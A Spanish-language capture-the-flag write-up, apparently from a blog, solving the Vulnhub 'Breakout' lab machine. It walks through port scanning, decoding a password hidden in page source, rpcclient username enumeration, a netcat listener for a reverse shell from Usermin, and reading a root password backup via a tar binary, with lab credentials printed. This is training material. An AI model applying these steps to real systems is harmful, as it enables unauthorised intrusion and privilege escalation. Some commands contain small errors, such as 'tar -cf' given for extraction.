---
title: Vulnhub - Breakout
author: cotes
date: 2023-09-06 17:51:00 +0800
categories: [Writeup, Vulnhub, Easy]
tags: [Linux, 'Information Leakage', 'RPC (User Enumeration)']
math: true
mermaid: true
image:
  path: /assets/images/Vulnhub/Easy/Breakout/logo.jpg
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Breakout Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnhub.

Técnicas usadas: **Information Leakage, RPC (User Enumeration)**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/Vulnhub/Easy/Breakout/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos.

* **`nmap -p<Ports> -sCV <IP> -oN versiones`**

    ![](/assets/images/Vulnhub/Easy/Breakout/02-versions.png)

c. Al fijarnos en el código fuente de la página web (**http://<IP Breakout>**), encontramos una credencial codificada en brainfuck

```brainfuck
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.
```

* Lo decodeamos en [dcode](https://www.dcode.fr/brainfuck-language) y la veremos en texto claro **.2uqPEfj3D<P'a-3**
* Como no tenemos un usuario válido, lo que haremos es enumerarlos con **rpcclient**

    ```bash
    cat /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt | while read username; do rpcclient -N -U "" <IP Breakout> -c "lookupnames $username"; done | grep -v "NT_STATUS_NONE_MAPPED"

    <SNIP>
    cyber S-1-22-1-1000 (User: 1)
    <SNIP>
    ```

d. El usuario cyber* es válido para **https://<IP Breakout>:20000/**

* Una vez logueados en el panel de **Usermin** lo que haremos es ponernos en escucha **`nc -lvnp 443`** y enviarnos una shell

    ![](/assets/images/Vulnhub/Easy/Breakout/03-usermin.png)

    ```bash
    -$ nv -lvnp 443
    cyber@breakout:~$
    ```

### Escalada de Privilegios 💹

a. Vemos un binario **tar** en el directorio de cyber

```bash
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
```

b. En **/var/backups/** vemos fichero **.old_pass.bak** el cual comprimiremos usando el binario tar que está en el directorio personal de cyber

```bash
cyber@breakout:~$ ./tar -cf compress.tar /var/backups/.old_pass.bak
```

* Ahora, descomprimimos **`tar -cf compress.tar`**, ahora ya podemos ver el contenido de .old_pass.bak el cual contiene una credencial en texto claro **Ts&4&YurgtRX(=~h**, usaremos esta contraseña para convertirnos en el usuario **root**

    ```bash
    cyber@breakout:~/var/backups$ su root
    Password: Ts&4&YurgtRX(=~h
    root@breakout:/home/cyber/var/backups#
    ```